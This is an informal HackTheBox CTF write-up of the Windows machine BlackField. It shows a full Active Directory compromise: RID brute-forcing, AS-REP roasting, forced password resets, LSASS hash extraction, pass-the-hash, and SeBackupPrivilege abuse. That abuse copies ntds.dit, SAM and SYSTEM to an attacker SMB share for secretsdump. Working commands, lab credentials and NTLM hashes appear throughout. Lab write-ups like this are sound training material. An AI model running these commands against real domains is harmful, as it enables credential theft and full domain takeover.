---
title: "BlackField"
date: 2026-03-06
draft: false
description: "HackTheBox BlackField writeup"
tags: ["hackthebox", "htb", "windows", "hard", "oscp"]
categories: ["CTF Writeups"]
showTableOfContents: true
showReadingTime: true
showWordCount: true
---

# BlackField

## Overview

- **OS:** Windows
- **IP:** 10.129.1.58
- **Difficulty:** Hard
- **Platform:** HackTheBox
- **OSCP:** Yes
- **Lists:** N/A

### Summary

found users thru rid brute with guest access, aseproasted found creds, force changed creds for audit aco access forensics share, dumped lsass found creds for service accouint, winrm as servcice and dumped ntds system and sam, found creds for Administrator.

## Loot

| Loot |  |
| --- | --- |
| **Category** | **Details** |
| Usernames | support |
| Passwords |  #00^BlackKnight |
| Usernames+Passwords | support: #00^BlackKnight

audit2020:Password@123 |
| Hashes |  |
| Service Versions |  |

## Enumeration

## Nmap

```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-06 07:55 EST
Nmap scan report for 10.129.1.58
Host is up (0.11s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        (generic dns response: SERVFAIL)
| fingerprint-strings: 
|   DNS-SD-TCP: 
|     _services
|     _dns-sd
|     _udp
|_    local
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-06 19:56:06Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
**5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)**
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.95%I=7%D=3/6%Time=69AACEF5%P=x86_64-pc-linux-gnu%r(DNS-S
SF:D-TCP,30,"\0\.\0\0\x80\x82\0\x01\0\0\0\0\0\0\t_services\x07_dns-sd\x04_
SF:udp\x05local\0\0\x0c\0\x01");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 6h59m58s
| smb2-time: 
|   date: 2026-03-06T19:56:35
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   112.72 ms 10.10.14.1
2   112.80 ms 10.129.1.58

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.87 seconds

```

## Dirbusting

```
nothing interesting AT ALL
```

## Port 80

Nothing

no subdomains either w wfuzz

## SMB

We have guest access lets try bruteforcing the RID

```
netexec smb blackfield.local -u 'guest' -p '' --rid-brute | grep "SidTypeUser" | awk -F'\\' '{print $2}' | awk '{print $1}' > users.txt
```

```
Administrator
Guest
krbtgt
DC01$
audit2020
support
BLACKFIELD764430
BLACKFIELD538365
BLACKFIELD189208
BLACKFIELD404458
BLACKFIELD706381
BLACKFIELD937395
BLACKFIELD553715
BLACKFIELD840481
BLACKFIELD622501
BLACKFIELD787464
BLACKFIELD163183
BLACKFIELD869335
BLACKFIELD319016
BLACKFIELD600999
BLACKFIELD894905
BLACKFIELD253541
BLACKFIELD175204
BLACKFIELD727512
BLACKFIELD227380
BLACKFIELD251003
BLACKFIELD129328
BLACKFIELD616527
BLACKFIELD533551
BLACKFIELD883784
BLACKFIELD908329
BLACKFIELD601590
BLACKFIELD573498
BLACKFIELD290325
BLACKFIELD775986
BLACKFIELD348433
BLACKFIELD196444
BLACKFIELD137694
BLACKFIELD533886
BLACKFIELD268320
BLACKFIELD909590
BLACKFIELD136813
BLACKFIELD358090
BLACKFIELD561870
BLACKFIELD269538
BLACKFIELD169035
BLACKFIELD118321
BLACKFIELD592556
BLACKFIELD618519
BLACKFIELD329802
BLACKFIELD753480
BLACKFIELD837541
BLACKFIELD186980
BLACKFIELD419600
BLACKFIELD220786
BLACKFIELD767820
BLACKFIELD549571
BLACKFIELD411740
BLACKFIELD768095
BLACKFIELD835725
BLACKFIELD251977
BLACKFIELD430864
BLACKFIELD413242
BLACKFIELD464763
BLACKFIELD266096
BLACKFIELD334058
BLACKFIELD404213
BLACKFIELD219324
BLACKFIELD412798
BLACKFIELD441593
BLACKFIELD606328
BLACKFIELD796301
BLACKFIELD415829
BLACKFIELD820995
BLACKFIELD695166
BLACKFIELD759042
BLACKFIELD607290
BLACKFIELD229506
BLACKFIELD256791
BLACKFIELD997545
BLACKFIELD114762
BLACKFIELD321206
BLACKFIELD195757
BLACKFIELD877328
BLACKFIELD446463
BLACKFIELD579980
BLACKFIELD775126
BLACKFIELD429587
BLACKFIELD534956
BLACKFIELD315276
BLACKFIELD995218
BLACKFIELD843883
BLACKFIELD876916
BLACKFIELD382769
BLACKFIELD194732
BLACKFIELD191416
BLACKFIELD932709
BLACKFIELD546640
BLACKFIELD569313
BLACKFIELD744790
BLACKFIELD739659
BLACKFIELD926559
BLACKFIELD969352
BLACKFIELD253047
BLACKFIELD899433
BLACKFIELD606964
BLACKFIELD385719
BLACKFIELD838710
BLACKFIELD608914
BLACKFIELD569653
BLACKFIELD759079
BLACKFIELD488531
BLACKFIELD160610
BLACKFIELD586934
BLACKFIELD819822
BLACKFIELD739765
BLACKFIELD875008
BLACKFIELD441759
BLACKFIELD763893
BLACKFIELD713470
BLACKFIELD131771
BLACKFIELD793029
BLACKFIELD694429
BLACKFIELD802251
BLACKFIELD602567
BLACKFIELD328983
BLACKFIELD990638
BLACKFIELD350809
BLACKFIELD405242
BLACKFIELD267457
BLACKFIELD686428
BLACKFIELD478828
BLACKFIELD129387
BLACKFIELD544934
BLACKFIELD115148
BLACKFIELD753537
BLACKFIELD416532
BLACKFIELD680939
BLACKFIELD732035
BLACKFIELD522135
BLACKFIELD773423
BLACKFIELD371669
BLACKFIELD252379
BLACKFIELD828826
BLACKFIELD548394
BLACKFIELD611993
BLACKFIELD192642
BLACKFIELD106360
BLACKFIELD939243
BLACKFIELD230515
BLACKFIELD774376
BLACKFIELD576233
BLACKFIELD676303
BLACKFIELD673073
BLACKFIELD558867
BLACKFIELD184482
BLACKFIELD724669
BLACKFIELD765350
BLACKFIELD411132
BLACKFIELD128775
BLACKFIELD704154
BLACKFIELD107197
BLACKFIELD994577
BLACKFIELD683323
BLACKFIELD433476
BLACKFIELD644281
BLACKFIELD195953
BLACKFIELD868068
BLACKFIELD690642
BLACKFIELD465267
BLACKFIELD199889
BLACKFIELD468839
BLACKFIELD348835
BLACKFIELD624385
BLACKFIELD818863
BLACKFIELD939200
BLACKFIELD135990
BLACKFIELD484290
BLACKFIELD898237
BLACKFIELD773118
BLACKFIELD148067
BLACKFIELD390179
BLACKFIELD359278
BLACKFIELD375924
BLACKFIELD533060
BLACKFIELD534196
BLACKFIELD639103
BLACKFIELD933887
BLACKFIELD907614
BLACKFIELD991588
BLACKFIELD781404
BLACKFIELD787995
BLACKFIELD911926
BLACKFIELD146200
BLACKFIELD826622
BLACKFIELD171624
BLACKFIELD497216
BLACKFIELD839613
BLACKFIELD428532
BLACKFIELD697473
BLACKFIELD291678
BLACKFIELD623122
BLACKFIELD765982
BLACKFIELD701303
BLACKFIELD250576
BLACKFIELD971417
BLACKFIELD160820
BLACKFIELD385928
BLACKFIELD848660
BLACKFIELD682842
BLACKFIELD813266
BLACKFIELD274577
BLACKFIELD448641
BLACKFIELD318077
BLACKFIELD289513
BLACKFIELD336573
BLACKFIELD962495
BLACKFIELD566117
BLACKFIELD617630
BLACKFIELD717683
BLACKFIELD390192
BLACKFIELD652779
BLACKFIELD665997
BLACKFIELD998321
BLACKFIELD946509
BLACKFIELD228442
BLACKFIELD548464
BLACKFIELD586592
BLACKFIELD512331
BLACKFIELD609423
BLACKFIELD395725
BLACKFIELD438923
BLACKFIELD691480
BLACKFIELD236467
BLACKFIELD895235
BLACKFIELD788523
BLACKFIELD710285
BLACKFIELD357023
BLACKFIELD362337
BLACKFIELD651599
BLACKFIELD579344
BLACKFIELD859776
BLACKFIELD789969
BLACKFIELD356727
BLACKFIELD962999
BLACKFIELD201655
BLACKFIELD635996
BLACKFIELD478410
BLACKFIELD518316
BLACKFIELD202900
BLACKFIELD767498
BLACKFIELD103974
BLACKFIELD135403
BLACKFIELD112766
BLACKFIELD978938
BLACKFIELD871753
BLACKFIELD136203
BLACKFIELD634593
BLACKFIELD274367
BLACKFIELD520852
BLACKFIELD339143
BLACKFIELD684814
BLACKFIELD792484
BLACKFIELD802875
BLACKFIELD383108
BLACKFIELD318250
BLACKFIELD496547
BLACKFIELD219914
BLACKFIELD454313
BLACKFIELD460131
BLACKFIELD613771
BLACKFIELD632329
BLACKFIELD402639
BLACKFIELD235930
BLACKFIELD246388
BLACKFIELD946435
BLACKFIELD739227
BLACKFIELD827906
BLACKFIELD198927
BLACKFIELD169876
BLACKFIELD150357
BLACKFIELD594619
BLACKFIELD274109
BLACKFIELD682949
BLACKFIELD316850
BLACKFIELD884808
BLACKFIELD327610
BLACKFIELD899238
BLACKFIELD184493
BLACKFIELD631162
BLACKFIELD591846
BLACKFIELD896715
BLACKFIELD500073
BLACKFIELD584113
BLACKFIELD204805
BLACKFIELD842593
BLACKFIELD397679
BLACKFIELD842438
BLACKFIELD286615
BLACKFIELD224839
BLACKFIELD631599
BLACKFIELD247450
BLACKFIELD290582
BLACKFIELD657263
BLACKFIELD314351
BLACKFIELD434395
BLACKFIELD410243
BLACKFIELD307633
BLACKFIELD758945
BLACKFIELD541148
BLACKFIELD532412
BLACKFIELD996878
BLACKFIELD653097
BLACKFIELD438814
svc_backup
lydericlefebvre
PC01$
PC02$
PC03$
PC04$
PC05$
PC06$
PC07$
PC08$
PC09$
PC10$
PC11$
PC12$
PC13$
SRV-WEB$
SRV-FILE$
SRV-EXCHANGE$
SRV-INTRANET$
```

lets roast them

we got suppport@blackfield.local

{{< figure src="image 549.png" >}}

lets crack it

{{< figure src="image 550.png" >}}

so we have #00^BlackKnight as the password for the support account

{{< figure src="image 551.png" >}}

lets check for password reuse while we enumerate the smb serv

## SMB

{{< figure src="image 552.png" >}}

we find a buuuunch of profiles

```
drw-rw-rw-          0  Wed Jun  3 12:47:11 2020 AAlleni
drw-rw-rw-          0  Wed Jun  3 12:47:11 2020 ABarteski
drw-rw-rw-          0  Wed Jun  3 12:47:11 2020 ABekesz
drw-rw-rw-          0  Wed Jun  3 12:47:11 2020 ABenzies
drw-rw-rw-          0  Wed Ju......

```

{{< figure src="image 553.png" >}}

lets check for cred reuse

none of them were reusing, please dont be another case of same user same pass, im going to check the bloodhound file i gather first

## Exploitation

ok so support can change the password of audit, we will change it and access that forensics share we saw earlier

{{< figure src="image 554.png" >}}

with

```
└─$ net rpc password "audit2020" "Password@123" -U "blackfield.local.htb"/"support"%"#00^BlackKnight" -S "blackfield.local"

```

now lets access the share with audit2020:Password@123

{{< figure src="image 555.png" >}}

{{< figure src="image 556.png" >}}

we have these two members

{{< figure src="image 557.png" >}}

so we have a another admin called Ipwn3dyourcompany interesting

got thsese hashesh when we used pypykatz to see the dump content for lsass

```
== MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
                DPAPI: a03cd8e9d30171f3cfe8caad92fef62100000000
                
Username: Administrator
                Domain: BLACKFIELD
                LM: NA
                NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
                SHA1: db5c89a961644f0978b4b69a4d2a2239d7886368
                DPAPI: 240339f898b6ac4ce3f34702e4a8955000000000

```

i passed the hashes and got svc on winrm

{{< figure src="image 558.png" >}}

{{< figure src="image 559.png" >}}

we can try dumping secrets

## SEBackupPrivilege

On kali create a file called viper.dsh

with the content

```
set context persistent nowriters
add volume c: alias viper
create
expose %viper% x:
```

unix2dos viper.dsh

cd c:\windows\tasks

```
powershell -c iwr -url [http://10.10.10.10/viper.dsh](http://10.10.10.10/viper.dsh) -o viper.dsh
```

or setup smb share, set it up anwyas

```
impacket-smbserver share ./ -smb2support -user test -pass ''
```

and then 

```
diskshadow /s viper.dsh
```

```
robocopy /b x:\windows\ntds . ntds.dit
```

```
reg save hklm\system c:\windows\tasks\system
reg save hklm\sam c:\windows\tasks\sam
```

```
net use \\10.10.10.10.\share /user:test
copy sam, ntds.dit, system \\10.10.10.10\share 
```

and now finally dump it

```
impacket-secretsdump -ntds ntds.dit -system system -sam sam local | tee dmp.txt
```

and we have Administrator hash

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7f82cc4be7ee6ca0b417c0719479dbec:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654a
```

lets PTH with this and grab flag
